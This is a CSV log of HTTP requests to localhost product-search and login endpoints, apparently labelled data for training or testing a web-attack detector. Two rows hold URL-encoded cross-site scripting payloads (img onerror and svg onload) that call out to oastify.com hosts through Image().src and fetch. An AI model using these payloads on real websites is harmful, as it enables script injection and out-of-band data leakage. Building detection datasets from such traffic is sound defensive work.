timestamp,source_ip,target_url,user_agent,ddos_score,payload_length,text,label
2026-01-02T04:58:57.810042,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:58:57.788097,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:58:57.771177,127.0.0.1,http://localhost:5000/protected/login,unknown,0,37,http://localhost:5000/protected/login unknown,2
2026-01-02T04:58:57.683572,127.0.0.1,http://localhost:5000/protected/user/login,unknown,0,42,http://localhost:5000/protected/user/login unknown,2
2026-01-02T04:58:57.652176,127.0.0.1,http://localhost:5000/protected/products?search=javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2frpkgbbpxz5tqlaje0emkfmcr9ifc36ryim99zxoX%3b.oastify.com%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e,unknown,0,290,http://localhost:5000/protected/products?search=javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2frpkgbbpxz5tqlaje0emkfmcr9ifc36ryim99zxoX%3b.oastify.com%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e unknown,2
2026-01-02T04:58:57.637900,127.0.0.1,http://localhost:5000/protected/login,unknown,0,37,http://localhost:5000/protected/login unknown,2
2026-01-02T04:58:57.605352,127.0.0.1,http://localhost:5000/protected/user/login,unknown,0,42,http://localhost:5000/protected/user/login unknown,2
2026-01-02T04:58:57.584715,127.0.0.1,http://localhost:5000/protected/products?search='%22%3e%3csvg%2fonload%3dfetch%60%2f%2f402tmo0aai43wnurbrxxqzn4kvqpej2bszjm9ay%5c.oastify.com%60%3e,unknown,0,147,http://localhost:5000/protected/products?search='%22%3e%3csvg%2fonload%3dfetch%60%2f%2f402tmo0aai43wnurbrxxqzn4kvqpej2bszjm9ay%5c.oastify.com%60%3e unknown,2
2026-01-02T04:58:57.555632,127.0.0.1,http://localhost:5000/protected/login,unknown,0,37,http://localhost:5000/protected/login unknown,2
2026-01-02T04:58:57.517099,127.0.0.1,http://localhost:5000/protected/user/login,unknown,0,42,http://localhost:5000/protected/user/login unknown,2
